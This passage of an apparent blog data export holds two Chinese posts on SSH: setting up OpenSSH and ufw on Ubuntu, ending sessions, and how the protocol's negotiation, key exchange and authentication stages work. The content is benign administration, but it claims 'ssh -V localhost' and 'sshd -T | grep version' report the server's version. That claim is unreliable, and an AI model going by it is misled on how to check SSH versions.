href=\"#一、安装操作\" class=\"headerlink\" title=\"一、安装操作\"></a>一、安装操作</h1><h2 id=\"1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\"><a href=\"#1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\" class=\"headerlink\" title=\"1. OpenSSH Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\"></a>1. <strong>OpenSSH Client（openssh-client）</strong>：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：</h2><ul>\n<li><code>ssh</code>：用于安全远程登录。</li>\n<li><code>scp</code>：用于安全复制文件。</li>\n<li><code>sftp</code>：用于安全文件传输。</li>\n<li><code>ssh-keygen</code>：用于生成和管理SSH密钥。</li>\n<li><code>ssh-copy-id</code>：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>OpenSSH Server（openssh-server）</strong>：这个服务器端工具允许远程用户通过SSH协议连接到这台机器。主要组件包括：<ul>\n<li><code>sshd</code>：SSH守护进程，处理和管理SSH连接。</li>\n<li>配置文件通常位于<code>/etc/ssh/sshd_config</code>，可以在这里进行各种设置，如端口、认证方式、允许或禁止的用户等。</li>\n</ul>\n</li>\n</ol>\n<p>要检查Ubuntu 24.04是否已安装OpenSSH工具包，可以使用以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">dpkg -l | grep openssh<br><br><span class=\"hljs-built_in\">sudo</span> apt update<br><span class=\"hljs-built_in\">sudo</span> apt install openssh-client openssh-server<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"二、查看SSH服务的版本\"><a href=\"#二、查看SSH服务的版本\" class=\"headerlink\" title=\"二、查看SSH服务的版本\"></a>二、查看SSH服务的版本</h1><h2 id=\"1-查看OpenSSH客户端版本：\"><a href=\"#1-查看OpenSSH客户端版本：\" class=\"headerlink\" title=\"1. 查看OpenSSH客户端版本：\"></a>1. <strong>查看OpenSSH客户端版本</strong>：</h2>   <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ssh -V<br></code></pre></td></tr></table></figure>\n<p>   这将输出类似于以下的信息：<br>   <figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">OpenSSH_8</span>.<span class=\"hljs-number\">9</span>p1, OpenSSL <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>n  <span class=\"hljs-number\">15</span> Mar <span class=\"hljs-number\">2022</span><br></code></pre></td></tr></table></figure></p>\n<h2 id=\"2-查看OpenSSH服务器版本：\"><a href=\"#2-查看OpenSSH服务器版本：\" class=\"headerlink\" title=\"2. 查看OpenSSH服务器版本：\"></a>2. <strong>查看OpenSSH服务器版本</strong>：</h2><p>   首先确保SSH服务器正在运行，然后使用以下命令连接到本地SSH服务器并查看其版本信息：<br>   <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ssh -V localhost<br></code></pre></td></tr></table></figure><br>   这将返回客户端和服务器的版本信息。如果只需要查看服务器版本信息，可以查找<code>sshd</code>守护进程的版本：<br>   <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">sudo</span> sshd -T | grep version<br></code></pre></td></tr></table></figure><br>   这将输出类似于以下的信息：<br>   <figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">sshd</span> version OpenSSH_8.<span class=\"hljs-number\">9</span>p1, OpenSSL <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>n  <span class=\"hljs-number\">15</span> Mar <span class=\"hljs-number\">2022</span><br></code></pre></td></tr></table></figure></p>\n<h1 id=\"三、启动操作\"><a href=\"#三、启动操作\" class=\"headerlink\" title=\"三、启动操作\"></a>三、启动操作</h1><h2 id=\"1-开启端口防火墙策略\"><a href=\"#1-开启端口防火墙策略\" class=\"headerlink\" title=\"1.开启端口防火墙策略\"></a>1.开启端口防火墙策略</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo apt install ufw<br>sudo ufw enable<br>sudo ufw allow 22<br>sudo ufw status<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-自定义开放端口-可选\"><a href=\"#2-自定义开放端口-可选\" class=\"headerlink\" title=\"2.自定义开放端口(可选)\"></a>2.自定义开放端口(可选)</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo ufw allow 2222<br>sudo ufw status<br></code></pre></td></tr></table></figure>\n<h2 id=\"3-启动SSH服务\"><a href=\"#3-启动SSH服务\" class=\"headerlink\" title=\"3.启动SSH服务\"></a>3.启动SSH服务</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo systemctl start ssh<br>sudo systemctl enable ssh  //自启动命令<br>sudo systemctl status ssh<br><br>/etc/ssh/sshd_config   // 配置文件所在位置<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"四、退出操作（exit）\"><a href=\"#四、退出操作（exit）\" class=\"headerlink\" title=\"四、退出操作（exit）\"></a>四、退出操作（exit）</h1><h3 id=\"方法1：使用exit命令\"><a href=\"#方法1：使用exit命令\" class=\"headerlink\" title=\"方法1：使用exit命令\"></a>方法1：使用<code>exit</code>命令</h3><p>在SSH会话中，可以使用<code>exit</code>命令退出会话并断开连接：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">exit</span><br></code></pre></td></tr></table></figure>\n\n<p>或者按 <code>Ctrl+D</code> 组合键，也可以关闭当前的SSH会话。</p>\n<h3 id=\"方法2：使用logout命令\"><a href=\"#方法2：使用logout命令\" class=\"headerlink\" title=\"方法2：使用logout命令\"></a>方法2：使用<code>logout</code>命令</h3><p>在某些系统上，可以使用<code>logout</code>命令断开SSH连接：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">logout</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"方法3：关闭终端\"><a href=\"#方法3：关闭终端\" class=\"headerlink\" title=\"方法3：关闭终端\"></a>方法3：关闭终端</h3><p>如果你是在终端（如gnome-terminal、xterm、tmux等）中运行的SSH连接，直接关闭终端窗口也会断开SSH连接。</p>\n<h3 id=\"方法4：使用kill命令（强制断开）\"><a href=\"#方法4：使用kill命令（强制断开）\" class=\"headerlink\" title=\"方法4：使用kill命令（强制断开）\"></a>方法4：使用<code>kill</code>命令（强制断开）</h3><p>如果需要强制断开SSH连接，可以在本地终端上找到SSH进程并杀掉它：</p>\n<ol>\n<li><p>找到SSH进程的PID：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ps aux | grep ssh<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>kill</code>命令终止进程（替换<code>&lt;PID&gt;</code>为实际的进程ID）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">kill</span> &lt;PID&gt;<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>如果<code>kill</code>命令无法终止进程，可以使用<code>kill -9</code>强制终止：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">kill</span> -9 &lt;PID&gt;<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"方法5：使用tmux或screen分离会话（可选）\"><a href=\"#方法5：使用tmux或screen分离会话（可选）\" class=\"headerlink\" title=\"方法5：使用tmux或screen分离会话（可选）\"></a>方法5：使用<code>tmux</code>或<code>screen</code>分离会话（可选）</h3><p>如果你在SSH会话中使用了<code>tmux</code>或<code>screen</code>，可以分离（detach）会话，而不会真正断开连接：</p>\n<ul>\n<li>在<code>tmux</code>中，按下 <code>Ctrl+B</code> 然后按 <code>D</code> 键。</li>\n<li>在<code>screen</code>中，按下 <code>Ctrl+A</code> 然后按 <code>D</code> 键。</li>\n</ul>\n<p>这将分离会话，但会话仍在远程主机上运行，你可以稍后重新连接。</p>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p>假设你当前在SSH会话中，只需键入<code>exit</code>并按回车即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">exit</span><br></code></pre></td></tr></table></figure>\n\n\n<h1 id=\"五、认证操作\"><a href=\"#五、认证操作\" class=\"headerlink\" title=\"五、认证操作\"></a>五、认证操作</h1><h2 id=\"（1）账号密码连接\"><a href=\"#（1）账号密码连接\" class=\"headerlink\" title=\"（1）账号密码连接\"></a>（1）账号密码连接</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">ssh ubuntu@192.168.179.141<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"（2）公私钥认证连接\"><a href=\"#（2）公私钥认证连接\" class=\"headerlink\" title=\"（2）公私钥认证连接\"></a>（2）公私钥认证连接</h2>"},{"title":"SSH-理论","date":"2024-07-22T08:20:19.000Z","_content":"\n\n\n# 1.SSH理论概述\n\n## （1）SSH工作的特点\n\n- 工作在应用层。\n- 使用TCP传输协议。\n- 密文传输命令，比telent明文传输命令更加安全。\n- 只能对与一个应用进行加密。\n- 需要双方都有公私钥对。\n- 端口22。\n\n## （2）SSH工作的基本框架\n\n### a. 传输层协议\n\n提供服务器认证，数据机密性，信息完整性 等的支持。\n\n### b. 用户认证协议\n\n为服务器提供客户端的身份鉴别。\n\n### c. 连接协议\n\n将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。\n\n\n## （3）SSH建立与通信的简单流程\n### a. 版本号协商阶段\n- 服务器打开端口 22，等待客户端连接。\n- 客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－<主协议版本号>.<次协议版本号>－<软件版本号>”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。\n- 客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。\n- 客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。\n- 如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。\n- 版本号协商阶段报文都是采用明文方式传输的。\n### b.密钥和算法协商阶段\n- 服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等;\n- 服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。\n- 服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。\n- 对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全\n- 在认证阶段，两端会使用会话 ID用于认证过程。\n-  在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。\n### c.认证阶段\n- 客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。\n- 服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。\n- 客户端从认证方法列表中选取一种认证方法再次进行认证。\n- 该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。\n\n#### SSH1认证的方式\n-  password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。\n- publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息。\n#### SSH2额外的认证方式\n- password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。\n- any认证：指定该用户的认证方式可以是 password，也可以是 publickey。\n### d.会话请求阶段\n- 服务器等待客户端的请求；\n- 认证通过后，客户端向服务器发送会话请求；\n- 服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。\n### e.交互会话阶段\n- 在这个模式下，数据被双向传送。\n- 客户端将要执行的命令加密后传给服务器;\n- 服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;\n- 客户端将接收到的结果解密后显示到终端上。\n\n\n\n# 2. [SSH实际流程数据包分析](https://blog.csdn.net/m0_49864110/article/details/128500490)\n\n## （1）版本协商\n\n### 客户端发送到服务端的协商\n![](../pic/Pasted%20image%2020240722150717.png)\n\n### 服务端返回给客户端的协商\n\n![](../pic/Pasted%20image%2020240722150736.png)\n\n\n## （2）算法协商\n\n### 客户端到服务端的算法协商\n![](../pic/Pasted%20image%2020240722151051.png)\n\n\n### 服务端到客户端的算法协商\n\n![](../pic/Pasted%20image%2020240722151212.png)\n\n\n\n## （3）密钥交换\n### 客户端到服务端密钥交换\n![](../pic/Pasted%20image%2020240722151314.png)\n\n### 服务端到客户端密钥交换+newkeys\n![](../pic/Pasted%20image%2020240722151617.png)\n\n\n### 客户端到服务端的newkeys\n![](../pic/Pasted%20image%2020240722151748.png)\n\n\n\n\n\n","source":"_posts/SSH-理论.md","raw":"---\ntitle: SSH-理论\ndate: 2024-07-22 16:20:19\ntags: \n- SSH\ncategories: \n- 网络协议\n- SSH\n---\n\n\n\n# 1.SSH理论概述\n\n## （1）SSH工作的特点\n\n- 工作在应用层。\n- 使用TCP传输协议。\n- 密文传输命令，比telent明文传输命令更加安全。\n- 只能对与一个应用进行加密。\n- 需要双方都有公私钥对。\n- 端口22。\n\n## （2）SSH工作的基本框架\n\n### a. 传输层协议\n\n提供服务器认证，数据机密性，信息完整性 等的支持。\n\n### b. 用户认证协议\n\n为服务器提供客户端的身份鉴别。\n\n### c. 连接协议\n\n将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。\n\n\n## （3）SSH建立与通信的简单流程\n### a. 版本号协商阶段\n- 服务器打开端口 22，等待客户端连接。\n- 客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－<主协议版本号>.<次协议版本号>－<软件版本号>”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。\n- 客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。\n- 客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。\n- 如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。\n- 版本号协商阶段报文都是采用明文方式传输的。\n### b.密钥和算法协商阶段\n- 服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等;\n- 服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。\n- 服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。\n- 对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全\n- 在认证阶段，两端会使用会话 ID用于认证过程。\n-  在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。\n### c.认证阶段\n- 客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。\n- 服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。\n- 客户端从认证方法列表中选取一种认证方法再次进行认证。\n- 该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。\n\n#### SSH1认证的方式\n-  password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。\n- publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息。\n#### SSH2额外的认证方式\n- password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。\n- any认证：指定该用户的认证方式可以是 password，也可以是 publickey。\n### d.会话请求阶段\n- 服务器等待客户端的请求；\n- 认证通过后，客户端向服务器发送会话请求；\n- 服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。\n### e.交互会话阶段\n- 在这个模式下，数据被双向传送。\n- 客户端将要执行的命令加密后传给服务器;\n- 服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;\n- 客户端将接收到的结果解密后显示到终端上。\n\n\n\n# 2. [SSH实际流程数据包分析](https://blog.csdn.net/m0_49864110/article/details/128500490)\n\n## （1）版本协商\n\n### 客户端发送到服务端的协商\n![](../pic/Pasted%20image%2020240722150717.png)\n\n### 服务端返回给客户端的协商\n\n![](../pic/Pasted%20image%2020240722150736.png)\n\n\n## （2）算法协商\n\n### 客户端到服务端的算法协商\n![](../pic/Pasted%20image%2020240722151051.png)\n\n\n### 服务端到客户端的算法协商\n\n![](../pic/Pasted%20image%2020240722151212.png)\n\n\n\n## （3）密钥交换\n### 客户端到服务端密钥交换\n![](../pic/Pasted%20image%2020240722151314.png)\n\n### 服务端到客户端密钥交换+newkeys\n![](../pic/Pasted%20image%2020240722151617.png)\n\n\n### 客户端到服务端的newkeys\n![](../pic/Pasted%20image%2020240722151748.png)\n\n\n\n\n\n","slug":"SSH-理论","published":1,"updated":"2024-08-01T16:18:40.789Z","_id":"clz7mrmk5001e8wunawo84hk9","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"1-SSH理论概述\"><a href=\"#1-SSH理论概述\" class=\"headerlink\" title=\"1.SSH理论概述\"></a>1.SSH理论概述</h1><h2 id=\"（1）SSH工作的特点\"><a href=\"#（1）SSH工作的特点\" class=\"headerlink\" title=\"（1）SSH工作的特点\"></a>（1）SSH工作的特点</h2><ul>\n<li>工作在应用层。</li>\n<li>使用TCP传输协议。</li>\n<li>密文传输命令，比telent明文传输命令更加安全。</li>\n<li>只能对与一个应用进行加密。</li>\n<li>需要双方都有公私钥对。</li>\n<li>端口22。</li>\n</ul>\n<h2 id=\"（2）SSH工作的基本框架\"><a href=\"#（2）SSH工作的基本框架\" class=\"headerlink\" title=\"（2）SSH工作的基本框架\"></a>（2）SSH工作的基本框架</h2><h3 id=\"a-传输层协议\"><a href=\"#a-传输层协议\" class=\"headerlink\" title=\"a. 传输层协议\"></a>a. 传输层协议</h3><p>提供服务器认证，数据机密性，信息完整性 等的支持。</p>\n<h3 id=\"b-用户认证协议\"><a href=\"#b-用户认证协议\" class=\"headerlink\" title=\"b. 用户认证协议\"></a>b. 用户认证协议</h3><p>为服务器提供客户端的身份鉴别。</p>\n<h3 id=\"c-连接协议\"><a href=\"#c-连接协议\" class=\"headerlink\" title=\"c. 连接协议\"></a>c. 连接协议</h3><p>将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。</p>\n<h2 id=\"（3）SSH建立与通信的简单流程\"><a href=\"#（3）SSH建立与通信的简单流程\" class=\"headerlink\" title=\"（3）SSH建立与通信的简单流程\"></a>（3）SSH建立与通信的简单流程</h2><h3 id=\"a-版本号协商阶段\"><a href=\"#a-版本号协商阶段\" class=\"headerlink\" title=\"a. 版本号协商阶段\"></a>a. 版本号协商阶段</h3><ul>\n<li>服务器打开端口 22，等待客户端连接。</li>\n<li>客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。</li>\n<li>客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。</li>\n<li>客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。</li>\n<li>如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。</li>\n<li>版本号协商阶段报文都是采用明文方式传输的。</li>\n</ul>\n<h3 id=\"b-密钥和算法协商阶段\"><a href=\"#b-密钥和算法协商阶段\" class=\"headerlink\" title=\"b.密钥和算法协商阶段\"></a>b.密钥和算法协商阶段</h3><ul>\n<li>服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等;</li>\n<li>服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。</li>\n<li>服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。</li>\n<li>对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全</li>\n<li>在认证阶段，两端会使用会话 ID用于认证过程。</li>\n<li> 在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。</li>\n</ul>\n<h3 id=\"c-认证阶段\"><a href=\"#c-认证阶段\" class=\"headerlink\" title=\"c.认证阶段\"></a>c.认证阶段</h3><ul>\n<li>客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。</li>\n<li>服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。</li>\n<li>客户端从认证方法列表中选取一种认证方法再次进行认证。</li>\n<li>该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。</li>\n</ul>\n<h4 id=\"SSH1认证的方式\"><a href=\"#SSH1认证的方式\" class=\"headerlink\" title=\"SSH1认证的方式\"></a>SSH1认证的方式</h4><ul>\n<li> password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。</li>\n<li>publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息。</li>\n</ul>\n<h4 id=\"SSH2额外的认证方式\"><a href=\"#SSH2额外的认证方式\" class=\"headerlink\" title=\"SSH2额外的认证方式\"></a>SSH2额外的认证方式</h4><ul>\n<li>password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。</li>\n<li>any认证：指定该用户的认证方式可以是 password，也可以是 publickey。</li>\n</ul>\n<h3 id=\"d-会话请求阶段\"><a href=\"#d-会话请求阶段\" class=\"headerlink\" title=\"d.会话请求阶段\"></a>d.会话请求阶段</h3><ul>\n<li>服务器等待客户端的请求；</li>\n<li>认证通过后，客户端向服务器发送会话请求；</li>\n<li>服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。</li>\n</ul>\n<h3 id=\"e-交互会话阶段\"><a href=\"#e-交互会话阶段\" class=\"headerlink\" title=\"e.交互会话阶段\"></a>e.交互会话阶段</h3><ul>\n<li>在这个模式下，数据被双向传送。</li>\n<li>客户端将要执行的命令加密后传给服务器;</li>\n<li>服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;</li>\n<li>客户端将接收到的结果解密后显示到终端上。</li>\n</ul>\n<h1 id=\"2-SSH实际流程数据包分析\"><a href=\"#2-SSH实际流程数据包分析\" class=\"headerlink\" title=\"2. SSH实际流程数据包分析\"></a>2. <a href=\"https://blog.csdn.net/m0_49864110/article/details/128500490\">SSH实际流程数据包分析</a></h1><h2 id=\"（1）版本协商\"><a href=\"#（1）版本协商\" class=\"headerlink\" title=\"（1）版本协商\"></a>（1）版本协商</h2><h3 id=\"客户端发送到服务端的协商\"><a href=\"#客户端发送到服务端的协商\" class=\"headerlink\" title=\"客户端发送到服务端的协商\"></a>客户端发送到服务端的协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722150717.png\"></p>\n<h3 id=\"服务端返回给客户端的协商\"><a href=\"#服务端返回给客户端的协商\" class=\"headerlink\" title=\"服务端返回给客户端的协商\"></a>服务端返回给客户端的协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722150736.png\"></p>\n<h2 id=\"（2）算法协商\"><a href=\"#（2）算法协商\" class=\"headerlink\" title=\"（2）算法协商\"></a>（2）算法协商</h2><h3 id=\"客户端到服务端的算法协商\"><a href=\"#客户端到服务端的算法协商\" class=\"headerlink\" title=\"客户端到服务端的算法协商\"></a>客户端到服务端的算法协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722151051.png\"></p>\n<h3 id=\"服务端到客户端的算法协商\"><a href=\"#服务端到客户端的算法协商\" class=\"headerlink\" title=\"服务端到客户端的算法协商\"></a>服务端到客户端的算法协商</h3><p><img src=\"/../pic/Pasted%20image%2020240722151212.png\"></p>\n<h2 id=\"（3）密钥交换\"><a href=\"#（3）密钥交换\" class=\"headerlink\" title=\"（3）密钥交换\"></a>（3）密钥交换</h2><h3 id=\"客户端到服务端密钥交换\"><a href=\"#客户端到服务端密钥交换\" class=\"headerlink\" title=\"客户端到服务端密钥交换\"></a>客户端到服务端密钥交换</h3><p><img src=\"/../pic/Pasted%20image%2020240722151314.png\"></p>\n<h3 id=\"服务端到客户端密钥交换-newkeys\"><a href=\"#服务端到客户端密钥交换-newkeys\" class=\"headerlink\" title=\"服务端到客户端密钥交换+newkeys\"></a>服务端到客户端密钥交换+newkeys</h3><p><img src=\"/../pic/Pasted%20image%2020240722151617.png\"></p>\n<h3 id=\"客户端到服务端的newkeys\"><a href=\"#客户端到服务端的newkeys\" class=\"headerlink\" title=\"客户端到服务端的newkeys\"></a>客户端到服务端的newkeys</h3><p><img src=\"/../pic/Pasted%20image%2020240722151748.png\"></p>\n","excerpt":"","more":"<h1 id=\"1-SSH理论概述\"><a href=\"#1-SSH理论概述\" class=\"headerlink\" title=\"1.SSH理论概述\"></a>1.SSH理论概述</h1><h2 id=\"（1）SSH工作的特点\"><a href=\"#（1）SSH工作的特点\" class=\"headerlink\" 